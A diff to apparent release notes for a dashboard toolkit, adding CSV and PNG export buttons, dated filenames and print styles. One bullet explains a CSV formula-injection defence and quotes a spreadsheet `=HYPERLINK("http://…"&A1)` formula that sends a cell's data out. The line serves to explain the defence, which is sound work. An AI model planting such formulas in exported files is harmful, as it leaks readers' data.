@@ -48,9 +48,45 @@ holds only the rows on screen.
   of ten thousand `<tr>` elements, which is the cost that shows up as a Desk
   that will not scroll. The gallery carries a 5,000-row example.
 
+**A number can leave the page.** Until now the only way to get a figure out of a
+dashboard and into a meeting was a screenshot of part of it, or a second query
+run by hand in a report.
+
+- **`export: true`** on a `table` draws a CSV button. The file holds what the
+  table *prints*, in the order it is currently showing — the reader's sort
+  included — and every row, including the ones a `virtual` table has nowhere
+  near the document. Scraping the DOM instead would have silently exported the
+  visible forty of five thousand.
+- **`export: true`** on a `chart` draws a PNG button, at twice screen
+  resolution and painted on the theme's surface colour. `toDataURL` stays
+  optional on the engine interface, so an engine that cannot do it draws no
+  button rather than one that does nothing.
+- Either takes `{filename, label}` instead of `true`. The saved name carries the
+  day it was taken (`nodes-2026-08-13.csv`), because a file called `export.csv`
+  in a downloads folder says nothing about which window it describes.
+- A CSV value beginning `=`, `+`, `-` or `@` is prefixed with a tab. Those run
+  as formulas when the file is opened, and `=HYPERLINK("http://…"&A1)` in one
+  cell mails the row beside it away, sent by a spreadsheet the reader trusts.
+  The visible content is unchanged.
+- `ui/export.js` is on the barrel — `to_csv`, `csv_cell`, `save_csv`,
+  `save_data_url`, `stamp` — for a page that wants its own button somewhere
+  this toolkit does not put one.
+
+**A dashboard prints.** `@media print` (§16 of `dash.scss`) forces the light
+palette on paper, hides the controls, uncaps a scrolling table so it prints all
+of its rows instead of its first 420px, holds a card together across a page
+break, and repeats a long table's header on each sheet. Status tints and pills
+are printed rather than dropped — the colour of a pill is its content. The light
+palette became a SCSS mixin to do it, so the print block re-includes §1 rather
+than carrying a second copy of it that drifts.
+
+A `virtual` table is the one thing this cannot rescue: only its visible rows are
+in the document, so it prints what is on screen. That is called out in
+`dashboard/README.md` next to the key that causes it.
+
 **Consumer action: none.** Every key is optional and a table that declares none
 of them renders exactly the markup it did before, with no mount phase and no
-JavaScript involved.
+JavaScript involved. Printing changes nothing on screen.
 
 ---
 
